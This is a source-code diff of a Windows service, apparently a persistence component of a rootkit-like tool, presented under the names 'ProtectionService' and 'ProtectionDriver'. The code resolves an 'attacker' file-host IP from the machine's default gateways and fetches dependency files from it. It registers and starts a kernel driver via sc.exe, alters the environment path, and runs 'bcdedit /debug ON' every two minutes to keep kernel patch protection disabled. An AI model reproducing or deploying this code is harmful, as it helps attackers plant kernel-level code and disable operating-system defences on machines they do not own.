@@ -5,9 +5,10 @@
 #include "service.h"
 #include <shlobj_core.h>
 WCHAR* AppDataPath = NULL;
+BOOL TerminateService = FALSE;
 
 
-// Declerations for used functions -
+// Declerations for used functions:
 VOID WINAPI ServiceMain(DWORD argc, LPTSTR* argv);  // actual Main() of service, initiates service operations
 VOID WINAPI ServiceControlHandler(DWORD);  // controls events, like IRP_MJ_DEVICE_CONTROL in KM
 DWORD WINAPI ServiceMainThread(LPVOID lpParam);  // main thread, actually activates the medium service and maps the driver
@@ -16,49 +17,67 @@ DWORD WINAPI ServiceMainThread(LPVOID lpParam);  // main thread, actually activa
 DWORD WINAPI ServiceMainThread(LPVOID lpParam) {
     int LastError = 0;
     char TargetIp[MAXIPV4_ADDRESS_SIZE] = { 0 };
-    char AttackerIp[MAXIPV4_ADDRESS_SIZE] = { 0 };
-    const char* AttackAddresses = "192.168.1.21~192.168.1.10~192.168.40.1";
+    char FileHostIp[MAXIPV4_ADDRESS_SIZE] = { 0 };
+    char* FileHostAddresses = NULL;
     WCHAR DriverServiceCreateCommand[MAX_PATH] = { 0 };
+    WCHAR EnvironmentVariablePath[MAX_PATH] = { 0 };
 
+
+    // Get the possible IP addresses for the attacker (in this case - all default gateways):
+    FileHostAddresses = GetGatewayList();
+    if (FileHostAddresses == NULL) {
+        return 1;
+    }
+    
 
     // Get IP addresses of target and attacker:
-    if (!MatchIpAddresses(TargetIp, AttackerIp, AttackAddresses)) {
-        return -1;
+    if (!MatchIpAddresses(TargetIp, FileHostIp, FileHostAddresses)) {
+        return 1;
     }
 
 
-    while (TRUE) {
+    while (!TerminateService) {
+        RtlZeroMemory(DriverServiceCreateCommand, MAX_PATH * sizeof(WCHAR));
+        RtlZeroMemory(EnvironmentVariablePath, MAX_PATH * sizeof(WCHAR));
+
+
         // Make sure that all depended-on files exist on target machine (folders + files):
         LastError = VerfifyDepDirs(AppDataPath);
         if (LastError != 0) {
             return LastError;
         }
-        LastError = VerfifyDepFiles(AttackerIp, AppDataPath);
+        LastError = VerfifyDepFiles(FileHostIp, AppDataPath);
         if (LastError != 0) {
             return LastError;
         }
 
 
         // Create service (if did not exist already, if does sc create will fail):
-        wcscat_s(DriverServiceCreateCommand, L"sc create ProtectionDriver type=kernel start=auto binPath=\"");
+        wcscat_s(DriverServiceCreateCommand, L"C:\\Windows\\System32\\sc.exe create ProtectionDriver type=kernel start=system binPath=\"");
         wcscat_s(DriverServiceCreateCommand, AppDataPath);
         wcscat_s(DriverServiceCreateCommand, L"\\ProtectionSolution\\KernelDriver\\ProtectionDriver.sys\"");
-        if (_wsystem(DriverServiceCreateCommand) == -1) {
-            return GetLastError();
-        }
+        _wsystem(DriverServiceCreateCommand);
+        system("sc start ProtectionDriver");  // If already exists/running - will fail
 
 
         // Verify if shortcut to wrappers dont point to wrappers, if so - link again:
+        wcscat_s(EnvironmentVariablePath, AppDataPath);
+        wcscat_s(EnvironmentVariablePath, L"\\ProtectionSolution\\DriverChecker");
+        LastError = AddPathToEnvVariable(EnvironmentVariablePath);
+        if (LastError != 0) {
+            return LastError;
+        }
+        
+
+        // Turn on all of the important security features ():
         // TODO
         
 
         // Make sure that KPP is still turned off:
-        if (system("bcdedit /debug ON") == -1) {
-            return ERROR_FUNCTION_FAILED;
-        }
+        system("bcdedit /debug ON");
         Sleep(120000);  // Sleep for 2 minutes
     }
-    return ERROR_SUCCESS;
+    return 0;
 }
 
 
@@ -77,6 +96,7 @@ VOID WINAPI ServiceControlHandler(DWORD CtrlCode)
         AutomaticService.ServiceStatus.dwCheckPoint = 4;
 
         SetServiceStatus(AutomaticService.StatusHandle, &AutomaticService.ServiceStatus);
+        TerminateService = TRUE;
         SetEvent(AutomaticService.StopEvent);  // Initiate the stop event - main working thread will be notified to stop working
         break;
 
@@ -140,17 +160,19 @@ VOID WINAPI ServiceMain(DWORD argc, LPTSTR* argv)
 
 
 int main(int argc, TCHAR* argv[]) {
-    WCHAR ServiceFilePath[MAX_PATH] = { 0 };
     WCHAR WideAutoName[] = L"ProtectionService";
+    char ServiceFilePath[MAX_PATH] = { 0 };
+    char AnsiAppDataPath[MAX_PATH] = { 0 };
     HRESULT Res = S_OK;
     AutomaticService.InitiateService(WideAutoName);
     Res = SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, NULL, &AppDataPath);
     if (AppDataPath == NULL || Res != S_OK) {
         return 0;
     }
-    wcscat_s(WideAutoName, AppDataPath);
-    wcscat_s(WideAutoName, L"\\ProtectionSolution\\Service\\ProtectionService.exe");
-    WcharpToCharp(AutomaticService.ServiceFile, WideAutoName);
+    WcharpToCharp(AnsiAppDataPath, AppDataPath);
+    strcat_s(ServiceFilePath, AnsiAppDataPath);
+    strcat_s(ServiceFilePath, "\\ProtectionSolution\\Service\\ProtectionService.exe");
+    RtlCopyMemory(AutomaticService.ServiceFile, ServiceFilePath, strlen(ServiceFilePath) + 1);
 
 
     // Define the service table entry of the auto service (name, entrypoint ..) -
